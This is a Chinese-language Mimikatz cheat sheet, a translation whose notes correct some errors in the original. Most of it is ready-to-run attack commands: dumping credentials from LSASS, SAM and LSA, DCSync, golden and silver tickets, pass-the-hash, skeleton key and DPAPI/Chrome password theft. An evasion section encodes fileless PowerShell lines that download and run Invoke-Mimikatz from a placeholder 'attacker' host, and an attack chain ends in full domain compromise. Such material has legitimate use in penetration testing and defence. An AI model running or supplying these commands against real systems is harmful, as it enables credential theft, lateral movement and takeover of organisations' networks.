# 🔑 Mimikatz 完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

> **译注：** 本文保留原始命令和参数，示例能否成功取决于 Windows 版本、保护配置、凭据类型及权限。`token::elevate` 的含义是模拟可访问的令牌，并非“启用所有特权”；参见 [Mimikatz 官方 token 模块](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_token.c)。`lsadump::lsa /patch` 和 `/inject` 通过 LSA 提取 SAM/AD 条目，不等于把 `NTDS.dit` 文件完整转储出来，参见 [官方 lsadump 模块](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c)。
>
> **票据示例勘误：** RID `500` 对应 Administrator 用户账户，不能当作管理员组 RID；`/sids` 用于附加 SID，并不是指定目标 DC，参见 [官方 Kerberos 模块](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)。有关账户与组的 SID/RID，参见 [微软 SID 说明](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)。原文中的组列表、虚构用户及票据示例均保持原样，不能据此假定适用于所有域配置。
>
> **保护机制说明：** “Credential Guard 绕过”小节不能仅凭一次 LSASS 读取错误判断该功能是否开启；DCSync 是需要相应目录复制权限的另一条路径，不是对 Credential Guard 的直接绕过。参见 [微软 Credential Guard 原理](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works)。改名、Base64 编码或内存执行也不保证避开检测；浏览器密码提取等旧版示例还受应用版本限制。

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Windows 凭据提取工具
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credentials">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 强大的 Windows 凭据提取工具</b>
</p>

---

## 📋 目录

- [什么是 Mimikatz](#-what-is-mimikatz)
- [入门](#-getting-started)
- [执行方式](#-execution-methods)
- [核心模块](#-core-modules)
- [凭据提取](#-credential-extraction)
- [Kerberos 攻击](#-kerberos-attacks)
- [高级攻击](#-advanced-attacks)
- [规避技术](#-evasion-techniques)
- [速查](#-quick-reference)

---

<a id="-what-is-mimikatz"></a>
## 🎯 什么是 Mimikatz

**Mimikatz** 是由 **Benjamin Delpy**（@gentilkiwi）开发的后渗透工具，可用于提取以下信息：

- 🔑 **明文密码** 来自 Windows 内存中的 LSASS（本地安全机构子系统服务）
- 🎫 **Kerberos 票据** (TGT, TGS)
- 🔐 **NTLM 哈希** 来自 SAM/NTDS
- 📜 **证书** 与私钥
- 🗝️ **缓存凭据**
- 🔒 **DPAPI（数据保护 API）机密**

### 为什么它很重要？

| 应用场景 | 说明 |
|----------|-------------|
| **凭据窃取** | 从内存中提取密码 |
| **横向移动** | 哈希传递（Pass-the-Hash）, 票据传递（Pass-the-Ticket） |
| **权限提升** | 模拟用户身份 |
| **持久化** | 黄金票据/白银票据 |
| **域控制** | 通过 DCSync 导致 AD 域整体失陷 |

---

<a id="-getting-started"></a>
## 🚀 入门

### 下载

```bash
# 官方仓库
git clone https://github.com/gentilkiwi/mimikatz.git

# 预编译二进制文件（发布版本）
# https://github.com/gentilkiwi/mimikatz/releases
```

### 前提条件

- **Administrator/SYSTEM** 权限（大多数功能需要）
- **SeDebugPrivilege** （用于访问 LSASS）
- Windows x64 或 x86

### 首批命令

```cmd
# 启动 mimikatz
mimikatz.exe

# 检查权限
mimikatz # privilege::debug
Privilege '20' OK

# 启用所有特权（原文描述有误，见译注）
mimikatz # token::elevate

# 退出
mimikatz # exit
```

---

<a id="-execution-methods"></a>
## 💻 执行方式

### 1. 独立二进制程序

```cmd
# 直接执行（可能被防病毒软件检测到）
mimikatz.exe

# 单行命令
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 将输出记录到文件
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# 使用 log 命令
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell（Invoke-Mimikatz）

```powershell
# 下载并在内存中执行（无文件方式）
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# 转储凭据
Invoke-Mimikatz -DumpCreds

# 转储证书
Invoke-Mimikatz -DumpCerts

# 在远程计算机上执行
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit（Kiwi）

```bash
# 在 meterpreter 会话中
meterpreter > load kiwi

# 获取帮助
meterpreter > help kiwi

# 转储所有凭据
meterpreter > creds_all

# 转储哈希
meterpreter > lsa_dump_sam

# 转储机密
meterpreter > lsa_dump_secrets

# Kerberos 票据
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# 转储 SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# 转储 LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# 转储 NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. 从内存转储文件中提取

```cmd
# 使用任务管理器或 procdump 转储 LSASS
procdump.exe -ma lsass.exe lsass.dmp

# 在 mimikatz 中加载转储文件
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

<a id="-core-modules"></a>
## 🔧 核心模块

### 模块概览

| 模块 | 说明 |
|--------|-------------|
| **sekurlsa** | 从 LSASS 内存中提取凭据 |
| **lsadump** | 转储 SAM、NTDS、机密和缓存 |
| **kerberos** | Kerberos 票据操作 |
| **crypto** | CryptoAPI 证书 |
| **vault** | Windows Vault（凭据管理器） |
| **token** | 令牌操作 |
| **privilege** | 特权操作 |
| **process** | 进程操作 |
| **service** | 服务操作 |
| **dpapi** | DPAPI（数据保护 API）机密 |
| **misc** | 其他命令 |

### 获取帮助

```cmd
# 列出所有模块
mimikatz # ::

# 模块帮助
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

<a id="-credential-extraction"></a>
## 🔐 凭据提取

### sekurlsa 模块（LSASS）

```cmd
# 先启用调试特权！
mimikatz # privilege::debug

# 转储所有登录凭据（明文、NTLM、SHA1）
mimikatz # sekurlsa::logonpasswords

# 仅转储 NTLM 哈希
mimikatz # sekurlsa::msv

# 转储 Kerberos 票据
mimikatz # sekurlsa::tickets

# 转储 WDigest 凭据（启用相应设置时可能为明文）
mimikatz # sekurlsa::wdigest

# 转储 Kerberos 加密密钥
mimikatz # sekurlsa::ekeys

# 转储 DPAPI 凭据
mimikatz # sekurlsa::dpapi

# 转储指定进程的凭据
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# 转储 TsPkg 凭据（RDP）
mimikatz # sekurlsa::tspkg

# 转储 LiveSSP 凭据
mimikatz # sekurlsa::livessp

# 转储 SSP 凭据
mimikatz # sekurlsa::ssp

# 转储 CloudAP 凭据（Azure AD）
mimikatz # sekurlsa::cloudap
```

### lsadump 模块（SAM/NTDS）

```cmd
# 转储 SAM 数据库（本地账户）
mimikatz # lsadump::sam

# 使用 SYSTEM 注册表配置单元转储 SAM
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# 转储 LSA 机密
mimikatz # lsadump::secrets

# 转储缓存凭据（DCC2）
mimikatz # lsadump::cache

# DCSync（模拟域控制器复制）
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# 转储 NTDS.dit（域控制器；原文表述见译注）
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# 转储信任密钥
mimikatz # lsadump::trust /patch

# 转储备份密钥（DPAPI）
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### vault 模块（凭据管理器）

```cmd
# 列出 Vault 凭据
mimikatz # vault::list

# 转储 Vault 凭据
mimikatz # vault::cred /patch
```

### dpapi 模块

```cmd
# 转储 DPAPI 主密钥
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# 解密 DPAPI 数据块（blob）
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Chrome 密码
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

<a id="-kerberos-attacks"></a>
## 🎫 Kerberos 攻击

### 查看票据

```cmd
# 列出所有票据
mimikatz # kerberos::list

# 列出票据详情（并导出，见 /export 参数）
mimikatz # kerberos::list /export

# 导出所有票据
mimikatz # sekurlsa::tickets /export
```

### 票据传递（Pass-the-Ticket，PtT）

```cmd
# 清除现有票据
mimikatz # kerberos::purge

# 导入票据
mimikatz # kerberos::ptt ticket.kirbi

# 验证票据
mimikatz # kerberos::list
```

### 黄金票据（域管理员持久化）

```cmd
# 前提条件：
# - 域名（domain.local）
# - 域 SID（S-1-5-21-...）
# - krbtgt 的 NTLM 哈希
# - 目标用户名（原文称可以虚构，具体受环境限制）

# 创建黄金票据
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# 创建并导出
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# 指定组（原文将 RID 500 标为 Admin、512 标为 Domain Admins，见译注）
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# 指定目标 DC（原文注释有误，此处实际使用 /sids）
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### 白银票据（针对特定服务）

```cmd
# 前提条件：
# - 域名
# - 域 SID
# - 目标服务账户的 NTLM 哈希
# - 服务 SPN（服务主体名称）

# 为 CIFS（文件共享）创建白银票据
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# 用于 HTTP（Web）的白银票据
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# 用于 SQL 的白银票据
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# 用于 WinRM/PSRemoting 的白银票据
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

<a id="-advanced-attacks"></a>
## 💀 高级攻击

### 哈希传递（Pass-the-Hash，PtH）

```cmd
# 使用 NTLM 哈希以指定用户身份运行命令
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# 使用 AES 密钥
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# 通过 PtH 创建进程
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash（密钥传递，Pass-the-Key）

```cmd
# 将 NTLM 凭据用于获取 Kerberos 票据
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# 随后请求 TGT
# klist 应显示 Kerberos 票据
```

### DCSync 攻击

```cmd
# 复制单个用户的数据
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# 复制 krbtgt 的数据（用于黄金票据）
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# 复制所有用户的数据
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# 从指定 DC 复制数据
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### 万能钥匙（Skeleton Key）

```cmd
# 向 DC 的 LSASS 注入 Skeleton Key（原文称所有用户均可用 "mimikatz" 认证；适用性取决于环境）
mimikatz # misc::skeleton

# 持续到 DC 重启
# 使用任意用户登录：password = mimikatz
```

### DPAPI 滥用

```cmd
# 转储主密钥
mimikatz # sekurlsa::dpapi

# 解密凭据文件
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# RDP 保存的密码
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### 令牌操作

```cmd
# 列出令牌
mimikatz # token::list

# 模拟 SYSTEM 令牌
mimikatz # token::elevate

# 模拟指定用户令牌
mimikatz # token::elevate /user:Administrator

# 恢复原始令牌
mimikatz # token::revert

# 以指定用户身份运行
mimikatz # token::run /user:domain\admin
```

---

<a id="-evasion-techniques"></a>
## 🛡️ 规避技术

### 混淆名称

```cmd
# 重命名 mimikatz.exe
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### PowerShell 混淆

```powershell
# Base64 编码
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### 仅在内存中执行

```powershell
# Invoke-Mimikatz（无文件方式）
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# 或使用 meterpreter 的 kiwi 扩展
meterpreter > load kiwi
meterpreter > creds_all
```

### LSASS 转储的其他方式

```cmd
# Procdump（由微软签名）
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll（系统内置）
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# 任务管理器（图形界面）
# 右键单击 lsass.exe > 创建转储文件（Create dump file）

# SQLDumper（来自 SQL Server）
sqldumper.exe <lsass_pid> 0 0x01100
```

### Credential Guard 绕过（原文标题，见译注）

```cmd
# 检查是否启用了 Credential Guard（不能仅凭下方错误确认）
mimikatz # sekurlsa::logonpasswords
# 原文称会显示 "ERROR kuhl_m_sekurlsa_acquireLSA"

# 替代思路：使用 DCSync（仍需目录复制权限）
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

<a id="-quick-reference"></a>
## 📊 速查

### 常用单行命令

```cmd
# 转储所有凭据
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 转储 SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync：复制所有用户
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# 黄金票据（Golden Ticket）
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# 哈希传递（Pass-the-Hash）
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### 模块速查

| 命令 | 说明 |
|---------|-------------|
| `privilege::debug` | 启用调试特权 |
| `token::elevate` | 模拟 SYSTEM 令牌 |
| `sekurlsa::logonpasswords` | 从 LSASS 转储所有凭据 |
| `sekurlsa::msv` | 转储 NTLM 哈希 |
| `sekurlsa::tickets` | 转储 Kerberos 票据 |
| `sekurlsa::pth` | 哈希传递（Pass-the-Hash） |
| `lsadump::sam` | 转储 SAM 数据库 |
| `lsadump::secrets` | 转储 LSA 机密 |
| `lsadump::dcsync` | DCSync 攻击 |
| `lsadump::lsa /patch` | 从 DC 提取 AD 凭据（原文标为转储 NTDS，见译注） |
| `kerberos::list` | 列出 Kerberos 票据 |
| `kerberos::ptt` | 票据传递（Pass-the-Ticket） |
| `kerberos::golden` | 创建黄金票据或白银票据 |
| `kerberos::purge` | 清除票据 |
| `vault::list` | 列出 Vault 凭据 |
| `dpapi::cred` | 解密 DPAPI 凭据 |

### 攻击链示例

```
1. 获得初始访问权限
2. privilege::debug
3. sekurlsa::logonpasswords (获取凭据)
4. sekurlsa::pth (横向移动)
5. lsadump::dcsync /user:krbtgt (获取 krbtgt 哈希)
6. kerberos::golden (创建黄金票据)
7. 域完全失陷！
```

---

## 📚 参考资源

- [官方 GitHub 仓库](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecurity Mimikatz 指南](https://adsecurity.org/?page_id=1821)
- [HackTricks Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### 相关速查表
- [Windows 权限提升](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/README.md)
- [Meterpreter](../../Metasploit/Meterpreter.md)

---

<p align="center">
  <b>🔑 掌握 Windows 凭据攻击技术！</b><br>
  <i>Mimikatz：面向 Windows 的黑客多功能工具</i>
</p>
